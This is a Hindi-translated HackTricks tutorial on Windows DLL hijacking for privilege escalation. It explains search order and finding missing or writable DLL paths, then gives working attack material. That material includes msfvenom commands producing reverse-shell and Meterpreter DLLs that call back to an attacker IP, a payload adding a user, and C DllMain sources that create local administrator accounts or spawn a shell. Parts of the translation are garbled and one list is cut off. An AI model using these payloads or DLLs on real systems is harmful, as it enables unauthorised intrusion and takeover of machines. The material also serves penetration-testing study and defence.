# Dll Hijacking

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a> <strong>के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)\*\* पर फॉलो\*\* करें।
* **HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में **PRs सबमिट करके** अपने हैकिंग ट्रिक्स साझा करें।

</details>

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**बग बाउंटी टिप**: **Intigriti** के लिए **साइन अप करें**, एक प्रीमियम **बग बाउंटी प्लेटफॉर्म जो हैकर्स द्वारा बनाई गई है**! आज ही हमारे साथ शामिल हों [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) और शुरू करें बाउंटी अप टू **$100,000** तक कमाना!

{% embed url="https://go.intigriti.com/hacktricks" %}

## मूलभूत जानकारी

DLL हाइजैकिंग में एक विश्वसनीय एप्लिकेशन को एक दुरुपयोगी DLL लोड करने में बदलना शामिल है। यह शब्द कई तकनीकों को शामिल करता है जैसे **DLL Spoofing, Injection, और Side-Loading**। यह मुख्य रूप से कोड निष्पादन, स्थिरता प्राप्ति और, कम आमतौर पर, विशेषाधिकार उन्नयन के लिए उपयोग किया जाता है। यहाँ उन्नयन पर ध्यान केंद्रित होने के बावजूद, हाइजैकिंग का तरीका उद्देश्यों के साथ संगत रहता है।

### सामान्य तकनीकें

कई तकनीकों का उपयोग DLL हाइजैकिंग के लिए किया जाता है, प्रत्येक की प्रभावकारिता एप्लिकेशन की DLL लोडिंग रणनीति पर निर्भर करती है:

1. **DLL प्रतिस्थापन**: एक विश्वसनीय DLL को एक दुरुपयोगी से बदलना, वैकल्पिक रूप से DLL प्रॉक्सीइंग का उपयोग करके मूल DLL की कार्यक्षमता को संरक्षित रखने के लिए।
2. **DLL खोज क्रम हाइजैकिंग**: विश्वसनीय DLL के सामने एक खोज पथ में दुरुपयोगी DLL रखना, एप्लिकेशन की खोज पैटर्न का शोषण करना।
3. **फैंटम DLL हाइजैकिंग**: एक दुरुपयोगी DLL बनाना जिसे एक एप्लिकेशन लोड करेगा, सोचते हुए कि यह एक अस्तित्वहीन आवश्यक DLL है।
4. **DLL पुनर्निर्देशन**: खोज पैरामीटरों को संशोधित करना जैसे `%PATH%` या `.exe.manifest` / `.exe.local` फ़ाइलें एप्लिकेशन को दुरुपयोगी DLL पर मार्गदर्शन करने के लिए।
5. **WinSxS DLL प्रतिस्थापन**: विश्वसनीय DLL को WinSxS निर्देशिका में एक दुरुपयोगी संबंधित वस्तु से प्रतिस्थापित करना, एक तकनीक जिसे अक्सर DLL साइड-लोडिंग के साथ जोड़ा जाता है।
6. **सापेक्ष मार्ग DLL हाइजैकिंग**: उपयोगकर्ता नियंत्रित निर्देशिका में दुरुपयोगी DLL रखना, नकली एप्लिकेशन के साथ जोड़े गए बाइनरी प्रॉक्सी निष्पादन तकनीकों की तरह।

## गायब Dlls खोजना

सिस्टम में गायब Dlls खोजने का सबसे सामान्य तरीका [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) को सिस्टम से चलाना है, **निम्नलिखित 2 फ़िल्टर सेट करें**:

![](<../../../.gitbook/assets/image (311).png>)

![](<../../../.gitbook/assets/image (313).png>)

और बस **फ़ाइल सिस्टम गतिविधि** दिखाएं:

![](<../../../.gitbook/assets/image (314).png>)

यदि आप **सामान्य रूप से गायब dlls खोज रहे हैं** तो आपको कुछ **सेकंड के लिए इसे चलने दें**।\
यदि आप **किसी विशेष एक्जीक्यूटेबल के भीतर गायब dll खोज रहे हैं** तो आपको **"प्रोसेस नाम" "शामिल है" "<एक्जीक्यूटेबल नाम>" जैसा एक और फ़िल्टर सेट करना चाहिए, इसे चलाएं और घटनाओं को रोकें**।

## गायब Dlls का शोषण

विशेषाधिकारों को उन्नत करने के लिए, हमारे पास सबसे अच्छा मौका है कि हम **एक dll लिख सकें जिसे एक विशेषाधिकार प्रक्रिया लोड करने की कोशिश करेगी** किसी **ऐसे स्थान पर जहां इसे खोजा जाएगा**। इसलिए, हमें **एक** ऐसे **फ़ोल्डर में एक dll लिखने की संभावना होगी जहां** यह **मूल dll से पहले खोजी जाएगी** (अजीब मामला), या हमें **किसी फ़ोल्डर पर लिखने की संभावना होगी जहां dll खोजी जाएगी** और मूल **dll किसी भी फ़ोल्डर में मौजूद नहीं है**।

### Dll खोज क्रम

[**Microsoft दस्तावेज़ीकरण**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **में आप विशेष रूप से कैसे Dlls लोड किए जाते हैं इसे देख सकते हैं।**

**Windows एप्लिकेशन** एक विशिष्ट क्रम का पालन करके DLLs की खोज करते हैं, एक विशेष क्रम का पालन करते हुए। DLL हाइजैकिंग की समस्या उत्पन्न होती है जब एक हानिकारक DLL इन निर्देशिकाओं में से एक में रणनीतिक रूप से रखा जाता है, यह सुनिश्चित करता है कि यह मूल DLL से पहले लोड होता है। इसे रोकने का एक समाधान यह है कि एप्लिकेशन को यह सुनिश्चित करना चाहिए कि वह उस DLL को जिसकी आवश्यकता होती है को संदर्भित करते समय पूर्ण मार्गों का उपयोग करता है।

आप 32-बिट सिस्टमों पर **DLL खोज क्रम** नीचे देख सकते हैं:

1. एप्लिकेशन जिससे लोड हुआ है उस निर्देशिका।
2. सिस्टम निर्देशिका। इस निर्देशिका का पथ प्राप्त करने के लिए [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) फ़ंक्शन का उपयोग करें।(_C:\Windows\System32_)
3. 16-बिट सिस्टम निर्देशिका। इस निर्देशिका का पथ प्राप्त करने के लिए कोई फ़ंक्शन नहीं है, लेकिन इसे खोजा जाता है। (_C:\Windows\System_)
4. Windows निर्देशिका। इस निर्देशिका का पथ प्राप्त करने के लिए [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) फ़ंक्शन का उपयोग करें।
5. (_C:\Windows_)
6. वर्तमान निर्देशिका।
7. PATH पर्यावरण च

#### Windows दस्तावेज़ से DLL खोज क्रम पर अपवाद

Windows दस्तावेज़ में कुछ विशेष अपवाद स्थानीय DLL खोज क्रम के लिए नोट किए गए हैं:

* **जब किसी DLL को मेमोरी में पहले से लोड किए गए DLL के नाम के साथ मिलता है**, तो सिस्टम सामान्य खोज को छोड़ देता है। इसके बजाय, यह रीडायरेक्शन और एक मैनिफेस्ट की जांच करता है पहले से मेमोरी में लोड किए गए DLL की ओर डिफ़ॉल्ट होता है। **इस स्थिति में, सिस्टम DLL के लिए खोज नहीं करता है**।
* जब DLL को **वर्तमान Windows संस्करण के लिए जाना गया DLL** माना जाता है, तो सिस्टम इसके जाने गए DLL के संस्करण का उपयोग करेगा, साथ ही इसके निर्भर DLL का, **खोज प्रक्रिया को छोड़ देता है**। रजिस्ट्री कुंजी **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** इन जाने गए DLLs की सूची को धारित करती है।
* अगर किसी **DLL की आवश्यकता होती है**, तो इन आवश्यक DLLs की खोज उनके **मॉड्यूल नामों** द्वारा होती है, चाहे पहली DLL पूरी पथ के माध्यम से पहचानी गई हो या न हो।

### प्रिविलेज उन्नति

**आवश्यकताएं**:

* **विभिन्न प्रिविलेजों के तहत काम करने वाली प्रक्रिया की पहचान करें** (क्षैतिज या लैटरल चलन), जिसमें **किसी DLL की कमी** है।
* सुनिश्चित करें कि **लिखने की पहुंच** उपलब्ध है किसी **निर्देशिका** में जिसमें **DLL** की **खोज की जाएगी**। यह स्थान कार्यक्रम की निर्देशिका या सिस्टम पथ के भीतर की निर्देशिका हो सकती है।

हां, आवश्यकताएं खोजना कठिन है क्योंकि **डिफ़ॉल्ट रूप से एक विशेषाधिकारी कार्यक्रम जो एक DLL की कमी है ढूंढना अजीब है** और यह भी **एक सिस्टम पथ फ़ोल्डर में लिखने की अनुमति होना और भी अजीब है** (आप डिफ़ॉल्ट रूप से नहीं कर सकते)। लेकिन, गलत रूप से विन्यस्त परिस्थितियों में यह संभव है।\
उस स्थिति में यदि आप भाग्यशाली हैं और आप आवश्यकताओं को पूरा करने में सफल होते हैं, तो आप [UACME](https://github.com/hfiref0x/UACME) परियोजना की जांच कर सकते हैं। परियोजना का **मुख्य लक्ष्य UAC को अनदेखा करना** है, लेकिन आप वहाँ एक Windows संस्करण के लिए एक Dll हाइजैकिंग का **PoC** भी पा सकते हैं (संभावना है केवल उस फ़ोल्डर के पथ को बदलकर जहाँ आपके लिखने की अनुमति है)।

ध्यान दें कि आप **किसी फ़ोल्डर में अपनी अनुमतियों की जांच कर सकते हैं** करके:

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

और **पथ के सभी फोल्डरों की अनुमतियों की जांच करें**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

आप एक executable के imports और एक dll के exports की जाँच भी कर सकते हैं:

```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

उच्चाधिकार बढ़ाने के लिए **Dll Hijacking का दुरुपयोग कैसे करें** के लिए पूर्ण मार्गदर्शिका के लिए जाँच करें:

{% content-ref url="writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### स्वचालित उपकरण

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)यह जांचेगा कि क्या आपके पास सिस्टम PATH के किसी भी फ़ोल्डर में लेखन अनुमतियाँ हैं।\
इस वंशवाद को खोजने के लिए अन्य दिलचस्प स्वचालित उपकरण हैं **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ और _Write-HijackDll._

### उदाहरण

यदि आप एक उत्पादनीय स्थिति को उत्पादनीय स्थिति में उच्च से उच्च उच्चाधिकार तक उचित रूप से शोषित करने के लिए एक उत्पादनीय स्थिति में से उच्च **(UAC को छलकर)** या **उच्च से सिस्टम तक उच्चाधिकार** के लिए उदाहरण ढूंढते हैं, तो उसे सफलतापूर्वक शोषित करने के लिए सबसे महत्वपूर्ण चीजों में से एक होगा **कम से कम सभी फ़ंक्शनों को निर्यात करने वाला एक dll बनाना जिन्हें एक्जीक्यूटेबल इससे आयात करेगा**। फिर भी, ध्यान दें कि Dll Hijacking का उपयोग करना उपयोगी होता है ताकि [माध्यम अभिकरण स्तर से उच्च **(UAC को छलकर)**](../../authentication-credentials-uac-and-efs/#uac) या **उच्च से सिस्टम**]\(./#from-high-integrity-to-system)\*\* तक उच्चाधिकार\*\*। आप एक मान्य dll बनाने का उदाहरण इस dll हाइजैकिंग अध्ययन में पा सकते हैं जिस पर ध्यान केंद्रित है dll हाइजैकिंग के लिए एक उदाहरण: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
इसके अतिरिक्त, **अगले खंड** में आपको कुछ **मूल dll कोड** मिलेंगे जो **नमूने** के रूप में उपयोगी हो सकते हैं या **एक dll बनाने के लिए** जिसमें **अनावश्यक फ़ंक्शनों को निर्यात किया जाता है**।

## **Dlls बनाना और कंपाइल करना**

### **Dll Proxifying**

मूल रूप से एक **Dll प्रॉक्सी** एक ऐसा Dll है जो **जब लोड होता है तो आपके दुराचारी कोड को निष्पादित करने में सक्षम है** लेकिन यह भी **वास्तविक पुस्तकालय को सभी कॉल को रील लाइब्रेरी को रिले करके उद्देश्यपूर्ण रूप से काम करने की क्षमता** है।

उपकरण [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) या [**Spartacus**](https://github.com/Accenture/Spartacus) आप वास्तविक पुस्तकालय को प्रॉक्सी करने के लिए एक एक्जीक्यूटेबल और चयन कर सकते हैं जिसे आप प्रॉक्सी करना चाहते हैं और **प्रॉक्सीफाइड dll उत्पन्न** कर सकते हैं या **Dll को इंडिकेट करें** और **प्रॉक्सीफाइड dll उत्पन्न** कर सकते हैं।

### **Meterpreter**

**गेट रेव शैल (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**मीटरप्रेटर प्राप्त करें (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**एक उपयोगकर्ता बनाएं (x86 में मैंने x64 संस्करण नहीं देखा):**

```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### अपना

ध्यान दें कि कई मामलों में वह Dll जिसे आप कंपाइल करते हैं, **कई फ़ंक्शन्स को निर्यात करना चाहिए** जो पीड़ित प्रक्रिया द्वारा लोड किए जाएंगे, यदि ये फ़ंक्शन्स मौजूद नहीं हैं तो **बाइनरी उन्हें लोड करने में सक्षम नहीं होगा** और **उत्पीड़न विफल हो जाएगा**।

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```

## संदर्भ

* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**बग बाउंटी टिप**: **साइन अप करें** **Intigriti** के लिए, एक प्रीमियम **बग बाउंटी प्लेटफॉर्म जो हैकर्स द्वारा बनाया गया है**! हमारे साथ जुड़ें [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) आज ही, और शुरू करें कमाई तक **$100,000** तक के बाउंटी!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
* प्राप्त करें [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com)
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** पर **फॉलो** करें 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें PRs के माध्यम से** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में सबमिट करके।

</details>
